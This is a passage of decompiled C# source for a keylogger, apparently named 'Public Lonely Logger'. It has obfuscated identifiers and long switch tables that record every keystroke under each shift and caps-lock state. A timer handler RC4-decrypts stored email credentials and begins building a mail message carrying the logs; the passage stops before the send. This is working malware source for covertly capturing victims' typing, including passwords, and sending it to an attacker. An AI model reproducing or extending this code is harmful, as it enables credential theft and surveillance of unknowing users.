          case Keys.NumPad9:
            this.dSai89gbJkSU4b1WW9CW += "9";
            break;
          case Keys.Multiply:
            this.dSai89gbJkSU4b1WW9CW += "*";
            break;
          case Keys.Add:
            this.dSai89gbJkSU4b1WW9CW += "+";
            break;
          case Keys.Subtract:
            this.dSai89gbJkSU4b1WW9CW += "-";
            break;
          case Keys.Decimal:
            this.dSai89gbJkSU4b1WW9CW += ".";
            break;
          case Keys.Divide:
            this.dSai89gbJkSU4b1WW9CW += "/";
            break;
          case Keys.F1:
            this.dSai89gbJkSU4b1WW9CW += "[F1]";
            break;
          case Keys.F2:
            this.dSai89gbJkSU4b1WW9CW += "[F2]";
            break;
          case Keys.F3:
            this.dSai89gbJkSU4b1WW9CW += "[F3]";
            break;
          case Keys.F4:
            this.dSai89gbJkSU4b1WW9CW += "[F4]";
            break;
          case Keys.F5:
            this.dSai89gbJkSU4b1WW9CW += "[F5]";
            break;
          case Keys.F6:
            this.dSai89gbJkSU4b1WW9CW += "[F6]";
            break;
          case Keys.F7:
            this.dSai89gbJkSU4b1WW9CW += "[F7]";
            break;
          case Keys.F8:
            this.dSai89gbJkSU4b1WW9CW += "[F8]";
            break;
          case Keys.F9:
            this.dSai89gbJkSU4b1WW9CW += "[F9]";
            break;
          case Keys.F10:
            this.dSai89gbJkSU4b1WW9CW += "[F10]";
            break;
          case Keys.F11:
            this.dSai89gbJkSU4b1WW9CW += "[F11]";
            break;
          case Keys.F12:
            this.dSai89gbJkSU4b1WW9CW += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.dSai89gbJkSU4b1WW9CW += ";";
            break;
          case Keys.Oemcomma:
            this.dSai89gbJkSU4b1WW9CW += ",";
            break;
          case Keys.OemMinus:
            this.dSai89gbJkSU4b1WW9CW += "-";
            break;
          case Keys.OemPeriod:
            this.dSai89gbJkSU4b1WW9CW += ".";
            break;
          case Keys.OemQuestion:
            this.dSai89gbJkSU4b1WW9CW += "/";
            break;
          case Keys.Oemtilde:
            this.dSai89gbJkSU4b1WW9CW += "`";
            break;
          case Keys.OemOpenBrackets:
            this.dSai89gbJkSU4b1WW9CW += "[";
            break;
          case Keys.OemPipe:
            this.dSai89gbJkSU4b1WW9CW += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.dSai89gbJkSU4b1WW9CW += "]";
            break;
          case Keys.OemQuotes:
            this.dSai89gbJkSU4b1WW9CW += "'";
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.Tab:
            this.dSai89gbJkSU4b1WW9CW += "[TAB]";
            break;
          case Keys.Return:
            this.dSai89gbJkSU4b1WW9CW += "\r\n";
            break;
          case Keys.Escape:
            this.dSai89gbJkSU4b1WW9CW += "[ESC]";
            break;
          case Keys.Space:
            this.dSai89gbJkSU4b1WW9CW += " ";
            break;
          case Keys.End:
            this.dSai89gbJkSU4b1WW9CW += "[END]";
            break;
          case Keys.Left:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Up:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Right:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Down:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Delete:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.D0:
            this.dSai89gbJkSU4b1WW9CW += "0";
            break;
          case Keys.D1:
            this.dSai89gbJkSU4b1WW9CW += "1";
            break;
          case Keys.D2:
            this.dSai89gbJkSU4b1WW9CW += "2";
            break;
          case Keys.D3:
            this.dSai89gbJkSU4b1WW9CW += "3";
            break;
          case Keys.D4:
            this.dSai89gbJkSU4b1WW9CW += "4";
            break;
          case Keys.D5:
            this.dSai89gbJkSU4b1WW9CW += "5";
            break;
          case Keys.D6:
            this.dSai89gbJkSU4b1WW9CW += "6";
            break;
          case Keys.D7:
            this.dSai89gbJkSU4b1WW9CW += "7";
            break;
          case Keys.D8:
            this.dSai89gbJkSU4b1WW9CW += "8";
            break;
          case Keys.D9:
            this.dSai89gbJkSU4b1WW9CW += "9";
            break;
          case Keys.A:
            this.dSai89gbJkSU4b1WW9CW += "A";
            break;
          case Keys.B:
            this.dSai89gbJkSU4b1WW9CW += "B";
            break;
          case Keys.C:
            this.dSai89gbJkSU4b1WW9CW += "C";
            break;
          case Keys.D:
            this.dSai89gbJkSU4b1WW9CW += "D";
            break;
          case Keys.E:
            this.dSai89gbJkSU4b1WW9CW += "E";
            break;
          case Keys.F:
            this.dSai89gbJkSU4b1WW9CW += "F";
            break;
          case Keys.G:
            this.dSai89gbJkSU4b1WW9CW += "G";
            break;
          case Keys.H:
            this.dSai89gbJkSU4b1WW9CW += "H";
            break;
          case Keys.I:
            this.dSai89gbJkSU4b1WW9CW += "I";
            break;
          case Keys.J:
            this.dSai89gbJkSU4b1WW9CW += "J";
            break;
          case Keys.K:
            this.dSai89gbJkSU4b1WW9CW += "K";
            break;
          case Keys.L:
            this.dSai89gbJkSU4b1WW9CW += "L";
            break;
          case Keys.M:
            this.dSai89gbJkSU4b1WW9CW += "M";
            break;
          case Keys.N:
            this.dSai89gbJkSU4b1WW9CW += "N";
            break;
          case Keys.O:
            this.dSai89gbJkSU4b1WW9CW += "O";
            break;
          case Keys.P:
            this.dSai89gbJkSU4b1WW9CW += "P";
            break;
          case Keys.Q:
            this.dSai89gbJkSU4b1WW9CW += "Q";
            break;
          case Keys.R:
            this.dSai89gbJkSU4b1WW9CW += "R";
            break;
          case Keys.S:
            this.dSai89gbJkSU4b1WW9CW += "S";
            break;
          case Keys.T:
            this.dSai89gbJkSU4b1WW9CW += "T";
            break;
          case Keys.U:
            this.dSai89gbJkSU4b1WW9CW += "U";
            break;
          case Keys.V:
            this.dSai89gbJkSU4b1WW9CW += "V";
            break;
          case Keys.W:
            this.dSai89gbJkSU4b1WW9CW += "W";
            break;
          case Keys.X:
            this.dSai89gbJkSU4b1WW9CW += "X";
            break;
          case Keys.Y:
            this.dSai89gbJkSU4b1WW9CW += "Y";
            break;
          case Keys.Z:
            this.dSai89gbJkSU4b1WW9CW += "Z";
            break;
          case Keys.NumPad0:
            this.dSai89gbJkSU4b1WW9CW += "0";
            break;
          case Keys.NumPad1:
            this.dSai89gbJkSU4b1WW9CW += "1";
            break;
          case Keys.NumPad2:
            this.dSai89gbJkSU4b1WW9CW += "2";
            break;
          case Keys.NumPad3:
            this.dSai89gbJkSU4b1WW9CW += "3";
            break;
          case Keys.NumPad4:
            this.dSai89gbJkSU4b1WW9CW += "4";
            break;
          case Keys.NumPad5:
            this.dSai89gbJkSU4b1WW9CW += "5";
            break;
          case Keys.NumPad6:
            this.dSai89gbJkSU4b1WW9CW += "6";
            break;
          case Keys.NumPad7:
            this.dSai89gbJkSU4b1WW9CW += "7";
            break;
          case Keys.NumPad8:
            this.dSai89gbJkSU4b1WW9CW += "8";
            break;
          case Keys.NumPad9:
            this.dSai89gbJkSU4b1WW9CW += "9";
            break;
          case Keys.Multiply:
            this.dSai89gbJkSU4b1WW9CW += "*";
            break;
          case Keys.Add:
            this.dSai89gbJkSU4b1WW9CW += "+";
            break;
          case Keys.Subtract:
            this.dSai89gbJkSU4b1WW9CW += "-";
            break;
          case Keys.Decimal:
            this.dSai89gbJkSU4b1WW9CW += ".";
            break;
          case Keys.Divide:
            this.dSai89gbJkSU4b1WW9CW += "/";
            break;
          case Keys.F1:
            this.dSai89gbJkSU4b1WW9CW += "[F1]";
            break;
          case Keys.F2:
            this.dSai89gbJkSU4b1WW9CW += "[F2]";
            break;
          case Keys.F3:
            this.dSai89gbJkSU4b1WW9CW += "[F3]";
            break;
          case Keys.F4:
            this.dSai89gbJkSU4b1WW9CW += "[F4]";
            break;
          case Keys.F5:
            this.dSai89gbJkSU4b1WW9CW += "[F5]";
            break;
          case Keys.F6:
            this.dSai89gbJkSU4b1WW9CW += "[F6]";
            break;
          case Keys.F7:
            this.dSai89gbJkSU4b1WW9CW += "[F7]";
            break;
          case Keys.F8:
            this.dSai89gbJkSU4b1WW9CW += "[F8]";
            break;
          case Keys.F9:
            this.dSai89gbJkSU4b1WW9CW += "[F9]";
            break;
          case Keys.F10:
            this.dSai89gbJkSU4b1WW9CW += "[F10]";
            break;
          case Keys.F11:
            this.dSai89gbJkSU4b1WW9CW += "[F11]";
            break;
          case Keys.F12:
            this.dSai89gbJkSU4b1WW9CW += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.dSai89gbJkSU4b1WW9CW += ";";
            break;
          case Keys.Oemcomma:
            this.dSai89gbJkSU4b1WW9CW += ",";
            break;
          case Keys.OemMinus:
            this.dSai89gbJkSU4b1WW9CW += "-";
            break;
          case Keys.OemPeriod:
            this.dSai89gbJkSU4b1WW9CW += ".";
            break;
          case Keys.OemQuestion:
            this.dSai89gbJkSU4b1WW9CW += "/";
            break;
          case Keys.Oemtilde:
            this.dSai89gbJkSU4b1WW9CW += "`";
            break;
          case Keys.OemOpenBrackets:
            this.dSai89gbJkSU4b1WW9CW += "[";
            break;
          case Keys.OemPipe:
            this.dSai89gbJkSU4b1WW9CW += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.dSai89gbJkSU4b1WW9CW += "]";
            break;
          case Keys.OemQuotes:
            this.dSai89gbJkSU4b1WW9CW += "'";
            break;
        }
      }
      else if (MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.Tab:
            this.dSai89gbJkSU4b1WW9CW += "[TAB]";
            break;
          case Keys.Return:
            this.dSai89gbJkSU4b1WW9CW += "\r\n";
            break;
          case Keys.Escape:
            this.dSai89gbJkSU4b1WW9CW += "[ESC]";
            break;
          case Keys.Space:
            this.dSai89gbJkSU4b1WW9CW += " ";
            break;
          case Keys.End:
            this.dSai89gbJkSU4b1WW9CW += "[END]";
            break;
          case Keys.Left:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Up:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Right:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Down:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Delete:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.D0:
            this.dSai89gbJkSU4b1WW9CW += ")";
            break;
          case Keys.D1:
            this.dSai89gbJkSU4b1WW9CW += "!";
            break;
          case Keys.D2:
            this.dSai89gbJkSU4b1WW9CW += "@";
            break;
          case Keys.D3:
            this.dSai89gbJkSU4b1WW9CW += "#";
            break;
          case Keys.D4:
            this.dSai89gbJkSU4b1WW9CW += "$";
            break;
          case Keys.D5:
            this.dSai89gbJkSU4b1WW9CW += "%";
            break;
          case Keys.D6:
            this.dSai89gbJkSU4b1WW9CW += "^";
            break;
          case Keys.D7:
            this.dSai89gbJkSU4b1WW9CW += "&";
            break;
          case Keys.D8:
            this.dSai89gbJkSU4b1WW9CW += "*";
            break;
          case Keys.D9:
            this.dSai89gbJkSU4b1WW9CW += "(";
            break;
          case Keys.A:
            this.dSai89gbJkSU4b1WW9CW += "A";
            break;
          case Keys.B:
            this.dSai89gbJkSU4b1WW9CW += "B";
            break;
          case Keys.C:
            this.dSai89gbJkSU4b1WW9CW += "C";
            break;
          case Keys.D:
            this.dSai89gbJkSU4b1WW9CW += "D";
            break;
          case Keys.E:
            this.dSai89gbJkSU4b1WW9CW += "E";
            break;
          case Keys.F:
            this.dSai89gbJkSU4b1WW9CW += "F";
            break;
          case Keys.G:
            this.dSai89gbJkSU4b1WW9CW += "G";
            break;
          case Keys.H:
            this.dSai89gbJkSU4b1WW9CW += "H";
            break;
          case Keys.I:
            this.dSai89gbJkSU4b1WW9CW += "I";
            break;
          case Keys.J:
            this.dSai89gbJkSU4b1WW9CW += "J";
            break;
          case Keys.K:
            this.dSai89gbJkSU4b1WW9CW += "K";
            break;
          case Keys.L:
            this.dSai89gbJkSU4b1WW9CW += "L";
            break;
          case Keys.M:
            this.dSai89gbJkSU4b1WW9CW += "M";
            break;
          case Keys.N:
            this.dSai89gbJkSU4b1WW9CW += "N";
            break;
          case Keys.O:
            this.dSai89gbJkSU4b1WW9CW += "O";
            break;
          case Keys.P:
            this.dSai89gbJkSU4b1WW9CW += "P";
            break;
          case Keys.Q:
            this.dSai89gbJkSU4b1WW9CW += "Q";
            break;
          case Keys.R:
            this.dSai89gbJkSU4b1WW9CW += "R";
            break;
          case Keys.S:
            this.dSai89gbJkSU4b1WW9CW += "S";
            break;
          case Keys.T:
            this.dSai89gbJkSU4b1WW9CW += "T";
            break;
          case Keys.U:
            this.dSai89gbJkSU4b1WW9CW += "U";
            break;
          case Keys.V:
            this.dSai89gbJkSU4b1WW9CW += "V";
            break;
          case Keys.W:
            this.dSai89gbJkSU4b1WW9CW += "W";
            break;
          case Keys.X:
            this.dSai89gbJkSU4b1WW9CW += "X";
            break;
          case Keys.Y:
            this.dSai89gbJkSU4b1WW9CW += "Y";
            break;
          case Keys.Z:
            this.dSai89gbJkSU4b1WW9CW += "Z";
            break;
          case Keys.Multiply:
            this.dSai89gbJkSU4b1WW9CW += "*";
            break;
          case Keys.Add:
            this.dSai89gbJkSU4b1WW9CW += "+";
            break;
          case Keys.Subtract:
            this.dSai89gbJkSU4b1WW9CW += "-";
            break;
          case Keys.Decimal:
            this.dSai89gbJkSU4b1WW9CW += ".";
            break;
          case Keys.Divide:
            this.dSai89gbJkSU4b1WW9CW += "/";
            break;
          case Keys.F1:
            this.dSai89gbJkSU4b1WW9CW += "[F1]";
            break;
          case Keys.F2:
            this.dSai89gbJkSU4b1WW9CW += "[F2]";
            break;
          case Keys.F3:
            this.dSai89gbJkSU4b1WW9CW += "[F3]";
            break;
          case Keys.F4:
            this.dSai89gbJkSU4b1WW9CW += "[F4]";
            break;
          case Keys.F5:
            this.dSai89gbJkSU4b1WW9CW += "[F5]";
            break;
          case Keys.F6:
            this.dSai89gbJkSU4b1WW9CW += "[F6]";
            break;
          case Keys.F7:
            this.dSai89gbJkSU4b1WW9CW += "[F7]";
            break;
          case Keys.F8:
            this.dSai89gbJkSU4b1WW9CW += "[F8]";
            break;
          case Keys.F9:
            this.dSai89gbJkSU4b1WW9CW += "[F9]";
            break;
          case Keys.F10:
            this.dSai89gbJkSU4b1WW9CW += "[F10]";
            break;
          case Keys.F11:
            this.dSai89gbJkSU4b1WW9CW += "[F11]";
            break;
          case Keys.F12:
            this.dSai89gbJkSU4b1WW9CW += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.dSai89gbJkSU4b1WW9CW += ":";
            break;
          case Keys.Oemcomma:
            this.dSai89gbJkSU4b1WW9CW += "<";
            break;
          case Keys.OemMinus:
            this.dSai89gbJkSU4b1WW9CW += "_";
            break;
          case Keys.OemPeriod:
            this.dSai89gbJkSU4b1WW9CW += ">";
            break;
          case Keys.OemQuestion:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Oemtilde:
            this.dSai89gbJkSU4b1WW9CW += "~";
            break;
          case Keys.OemOpenBrackets:
            this.dSai89gbJkSU4b1WW9CW += "{";
            break;
          case Keys.OemPipe:
            this.dSai89gbJkSU4b1WW9CW += "|";
            break;
          case Keys.OemCloseBrackets:
            this.dSai89gbJkSU4b1WW9CW += "}";
            break;
          case Keys.OemQuotes:
            this.dSai89gbJkSU4b1WW9CW += "'";
            break;
        }
      }
      else if (!MyProject.Computer.Keyboard.ShiftKeyDown & MyProject.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.Tab:
            this.dSai89gbJkSU4b1WW9CW += "[TAB]";
            break;
          case Keys.Return:
            this.dSai89gbJkSU4b1WW9CW += "\r\n";
            break;
          case Keys.Escape:
            this.dSai89gbJkSU4b1WW9CW += "[ESC]";
            break;
          case Keys.Space:
            this.dSai89gbJkSU4b1WW9CW += " ";
            break;
          case Keys.End:
            this.dSai89gbJkSU4b1WW9CW += "[END]";
            break;
          case Keys.Left:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Up:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Right:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Down:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Delete:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.D0:
            this.dSai89gbJkSU4b1WW9CW += "0";
            break;
          case Keys.D1:
            this.dSai89gbJkSU4b1WW9CW += "1";
            break;
          case Keys.D2:
            this.dSai89gbJkSU4b1WW9CW += "2";
            break;
          case Keys.D3:
            this.dSai89gbJkSU4b1WW9CW += "3";
            break;
          case Keys.D4:
            this.dSai89gbJkSU4b1WW9CW += "4";
            break;
          case Keys.D5:
            this.dSai89gbJkSU4b1WW9CW += "5";
            break;
          case Keys.D6:
            this.dSai89gbJkSU4b1WW9CW += "6";
            break;
          case Keys.D7:
            this.dSai89gbJkSU4b1WW9CW += "7";
            break;
          case Keys.D8:
            this.dSai89gbJkSU4b1WW9CW += "8";
            break;
          case Keys.D9:
            this.dSai89gbJkSU4b1WW9CW += "9";
            break;
          case Keys.A:
            this.dSai89gbJkSU4b1WW9CW += "a";
            break;
          case Keys.B:
            this.dSai89gbJkSU4b1WW9CW += "b";
            break;
          case Keys.C:
            this.dSai89gbJkSU4b1WW9CW += "c";
            break;
          case Keys.D:
            this.dSai89gbJkSU4b1WW9CW += "d";
            break;
          case Keys.E:
            this.dSai89gbJkSU4b1WW9CW += "e";
            break;
          case Keys.F:
            this.dSai89gbJkSU4b1WW9CW += "f";
            break;
          case Keys.G:
            this.dSai89gbJkSU4b1WW9CW += "g";
            break;
          case Keys.H:
            this.dSai89gbJkSU4b1WW9CW += "h";
            break;
          case Keys.I:
            this.dSai89gbJkSU4b1WW9CW += "i";
            break;
          case Keys.J:
            this.dSai89gbJkSU4b1WW9CW += "j";
            break;
          case Keys.K:
            this.dSai89gbJkSU4b1WW9CW += "k";
            break;
          case Keys.L:
            this.dSai89gbJkSU4b1WW9CW += "l";
            break;
          case Keys.M:
            this.dSai89gbJkSU4b1WW9CW += "m";
            break;
          case Keys.N:
            this.dSai89gbJkSU4b1WW9CW += "n";
            break;
          case Keys.O:
            this.dSai89gbJkSU4b1WW9CW += "o";
            break;
          case Keys.P:
            this.dSai89gbJkSU4b1WW9CW += "p";
            break;
          case Keys.Q:
            this.dSai89gbJkSU4b1WW9CW += "q";
            break;
          case Keys.R:
            this.dSai89gbJkSU4b1WW9CW += "r";
            break;
          case Keys.S:
            this.dSai89gbJkSU4b1WW9CW += "s";
            break;
          case Keys.T:
            this.dSai89gbJkSU4b1WW9CW += "t";
            break;
          case Keys.U:
            this.dSai89gbJkSU4b1WW9CW += "u";
            break;
          case Keys.V:
            this.dSai89gbJkSU4b1WW9CW += "v";
            break;
          case Keys.W:
            this.dSai89gbJkSU4b1WW9CW += "w";
            break;
          case Keys.X:
            this.dSai89gbJkSU4b1WW9CW += "x";
            break;
          case Keys.Y:
            this.dSai89gbJkSU4b1WW9CW += "y";
            break;
          case Keys.Z:
            this.dSai89gbJkSU4b1WW9CW += "z";
            break;
          case Keys.Multiply:
            this.dSai89gbJkSU4b1WW9CW += "*";
            break;
          case Keys.Add:
            this.dSai89gbJkSU4b1WW9CW += "+";
            break;
          case Keys.Subtract:
            this.dSai89gbJkSU4b1WW9CW += "-";
            break;
          case Keys.Decimal:
            this.dSai89gbJkSU4b1WW9CW += ".";
            break;
          case Keys.Divide:
            this.dSai89gbJkSU4b1WW9CW += "/";
            break;
          case Keys.F1:
            this.dSai89gbJkSU4b1WW9CW += "[F1]";
            break;
          case Keys.F2:
            this.dSai89gbJkSU4b1WW9CW += "[F2]";
            break;
          case Keys.F3:
            this.dSai89gbJkSU4b1WW9CW += "[F3]";
            break;
          case Keys.F4:
            this.dSai89gbJkSU4b1WW9CW += "[F4]";
            break;
          case Keys.F5:
            this.dSai89gbJkSU4b1WW9CW += "[F5]";
            break;
          case Keys.F6:
            this.dSai89gbJkSU4b1WW9CW += "[F6]";
            break;
          case Keys.F7:
            this.dSai89gbJkSU4b1WW9CW += "[F7]";
            break;
          case Keys.F8:
            this.dSai89gbJkSU4b1WW9CW += "[F8]";
            break;
          case Keys.F9:
            this.dSai89gbJkSU4b1WW9CW += "[F9]";
            break;
          case Keys.F10:
            this.dSai89gbJkSU4b1WW9CW += "[F10]";
            break;
          case Keys.F11:
            this.dSai89gbJkSU4b1WW9CW += "[F11]";
            break;
          case Keys.F12:
            this.dSai89gbJkSU4b1WW9CW += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.dSai89gbJkSU4b1WW9CW += ";";
            break;
          case Keys.Oemcomma:
            this.dSai89gbJkSU4b1WW9CW += ",";
            break;
          case Keys.OemMinus:
            this.dSai89gbJkSU4b1WW9CW += "-";
            break;
          case Keys.OemPeriod:
            this.dSai89gbJkSU4b1WW9CW += ".";
            break;
          case Keys.OemQuestion:
            this.dSai89gbJkSU4b1WW9CW += "/";
            break;
          case Keys.Oemtilde:
            this.dSai89gbJkSU4b1WW9CW += "`";
            break;
          case Keys.OemOpenBrackets:
            this.dSai89gbJkSU4b1WW9CW += "[";
            break;
          case Keys.OemPipe:
            this.dSai89gbJkSU4b1WW9CW += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.dSai89gbJkSU4b1WW9CW += "]";
            break;
          case Keys.OemQuotes:
            this.dSai89gbJkSU4b1WW9CW += "'";
            break;
        }
      }
      else
      {
        if (!(MyProject.Computer.Keyboard.ShiftKeyDown & !MyProject.Computer.Keyboard.CapsLock))
          return;
        switch (Key)
        {
          case Keys.Back:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.Tab:
            this.dSai89gbJkSU4b1WW9CW += "[TAB]";
            break;
          case Keys.Return:
            this.dSai89gbJkSU4b1WW9CW += "\r\n";
            break;
          case Keys.Escape:
            this.dSai89gbJkSU4b1WW9CW += "[ESC]";
            break;
          case Keys.Space:
            this.dSai89gbJkSU4b1WW9CW += " ";
            break;
          case Keys.End:
            this.dSai89gbJkSU4b1WW9CW += "[END]";
            break;
          case Keys.Left:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Up:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Right:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Down:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Delete:
            this.dSai89gbJkSU4b1WW9CW = this.dSai89gbJkSU4b1WW9CW.Remove(checked (this.dSai89gbJkSU4b1WW9CW.Length - 1), 1);
            break;
          case Keys.D0:
            this.dSai89gbJkSU4b1WW9CW += ")";
            break;
          case Keys.D1:
            this.dSai89gbJkSU4b1WW9CW += "!";
            break;
          case Keys.D2:
            this.dSai89gbJkSU4b1WW9CW += "@";
            break;
          case Keys.D3:
            this.dSai89gbJkSU4b1WW9CW += "#";
            break;
          case Keys.D4:
            this.dSai89gbJkSU4b1WW9CW += "$";
            break;
          case Keys.D5:
            this.dSai89gbJkSU4b1WW9CW += "%";
            break;
          case Keys.D6:
            this.dSai89gbJkSU4b1WW9CW += "^";
            break;
          case Keys.D7:
            this.dSai89gbJkSU4b1WW9CW += "&";
            break;
          case Keys.D8:
            this.dSai89gbJkSU4b1WW9CW += "*";
            break;
          case Keys.D9:
            this.dSai89gbJkSU4b1WW9CW += "(";
            break;
          case Keys.A:
            this.dSai89gbJkSU4b1WW9CW += "A";
            break;
          case Keys.B:
            this.dSai89gbJkSU4b1WW9CW += "B";
            break;
          case Keys.C:
            this.dSai89gbJkSU4b1WW9CW += "C";
            break;
          case Keys.D:
            this.dSai89gbJkSU4b1WW9CW += "D";
            break;
          case Keys.E:
            this.dSai89gbJkSU4b1WW9CW += "E";
            break;
          case Keys.F:
            this.dSai89gbJkSU4b1WW9CW += "F";
            break;
          case Keys.G:
            this.dSai89gbJkSU4b1WW9CW += "G";
            break;
          case Keys.H:
            this.dSai89gbJkSU4b1WW9CW += "H";
            break;
          case Keys.I:
            this.dSai89gbJkSU4b1WW9CW += "I";
            break;
          case Keys.J:
            this.dSai89gbJkSU4b1WW9CW += "J";
            break;
          case Keys.K:
            this.dSai89gbJkSU4b1WW9CW += "K";
            break;
          case Keys.L:
            this.dSai89gbJkSU4b1WW9CW += "L";
            break;
          case Keys.M:
            this.dSai89gbJkSU4b1WW9CW += "M";
            break;
          case Keys.N:
            this.dSai89gbJkSU4b1WW9CW += "N";
            break;
          case Keys.O:
            this.dSai89gbJkSU4b1WW9CW += "O";
            break;
          case Keys.P:
            this.dSai89gbJkSU4b1WW9CW += "P";
            break;
          case Keys.Q:
            this.dSai89gbJkSU4b1WW9CW += "Q";
            break;
          case Keys.R:
            this.dSai89gbJkSU4b1WW9CW += "R";
            break;
          case Keys.S:
            this.dSai89gbJkSU4b1WW9CW += "S";
            break;
          case Keys.T:
            this.dSai89gbJkSU4b1WW9CW += "T";
            break;
          case Keys.U:
            this.dSai89gbJkSU4b1WW9CW += "U";
            break;
          case Keys.V:
            this.dSai89gbJkSU4b1WW9CW += "V";
            break;
          case Keys.W:
            this.dSai89gbJkSU4b1WW9CW += "W";
            break;
          case Keys.X:
            this.dSai89gbJkSU4b1WW9CW += "X";
            break;
          case Keys.Y:
            this.dSai89gbJkSU4b1WW9CW += "Y";
            break;
          case Keys.Z:
            this.dSai89gbJkSU4b1WW9CW += "Z";
            break;
          case Keys.Multiply:
            this.dSai89gbJkSU4b1WW9CW += "*";
            break;
          case Keys.Add:
            this.dSai89gbJkSU4b1WW9CW += "+";
            break;
          case Keys.Subtract:
            this.dSai89gbJkSU4b1WW9CW += "-";
            break;
          case Keys.Decimal:
            this.dSai89gbJkSU4b1WW9CW += ".";
            break;
          case Keys.Divide:
            this.dSai89gbJkSU4b1WW9CW += "/";
            break;
          case Keys.F1:
            this.dSai89gbJkSU4b1WW9CW += "[F1]";
            break;
          case Keys.F2:
            this.dSai89gbJkSU4b1WW9CW += "[F2]";
            break;
          case Keys.F3:
            this.dSai89gbJkSU4b1WW9CW += "[F3]";
            break;
          case Keys.F4:
            this.dSai89gbJkSU4b1WW9CW += "[F4]";
            break;
          case Keys.F5:
            this.dSai89gbJkSU4b1WW9CW += "[F5]";
            break;
          case Keys.F6:
            this.dSai89gbJkSU4b1WW9CW += "[F6]";
            break;
          case Keys.F7:
            this.dSai89gbJkSU4b1WW9CW += "[F7]";
            break;
          case Keys.F8:
            this.dSai89gbJkSU4b1WW9CW += "[F8]";
            break;
          case Keys.F9:
            this.dSai89gbJkSU4b1WW9CW += "[F9]";
            break;
          case Keys.F10:
            this.dSai89gbJkSU4b1WW9CW += "[F10]";
            break;
          case Keys.F11:
            this.dSai89gbJkSU4b1WW9CW += "[F11]";
            break;
          case Keys.F12:
            this.dSai89gbJkSU4b1WW9CW += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.dSai89gbJkSU4b1WW9CW += ":";
            break;
          case Keys.Oemcomma:
            this.dSai89gbJkSU4b1WW9CW += "<";
            break;
          case Keys.OemMinus:
            this.dSai89gbJkSU4b1WW9CW += "_";
            break;
          case Keys.OemPeriod:
            this.dSai89gbJkSU4b1WW9CW += ">";
            break;
          case Keys.OemQuestion:
            this.dSai89gbJkSU4b1WW9CW += "?";
            break;
          case Keys.Oemtilde:
            this.dSai89gbJkSU4b1WW9CW += "~";
            break;
          case Keys.OemOpenBrackets:
            this.dSai89gbJkSU4b1WW9CW += "{";
            break;
          case Keys.OemPipe:
            this.dSai89gbJkSU4b1WW9CW += "|";
            break;
          case Keys.OemCloseBrackets:
            this.dSai89gbJkSU4b1WW9CW += "}";
            break;
          case Keys.OemQuotes:
            this.dSai89gbJkSU4b1WW9CW += "'";
            break;
        }
      }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        string text1 = this.extension1.Text;
label_2:
        num3 = 3;
        this.drCpFfKGVlcmm4BbWDaB = Form1.rc4(text1, "qwerty");
label_3:
        num3 = 4;
        string text2 = this.extension2.Text;
label_4:
        num3 = 5;
        this.LzH8BeS1gYj0xcWTXZsd = Form1.rc4(text2, "qwerty1");
label_5:
        num3 = 6;
        MailMessage message = new MailMessage();
label_6:
        num3 = 7;
        message.From = new MailAddress(this.drCpFfKGVlcmm4BbWDaB);
label_7:
        num3 = 8;
        message.To.Add(this.drCpFfKGVlcmm4BbWDaB);
label_8:
        num3 = 9;
        message.Subject = "-=-Public Lonely Logger Logs V1.0-=-";
label_9:
        num3 = 10;
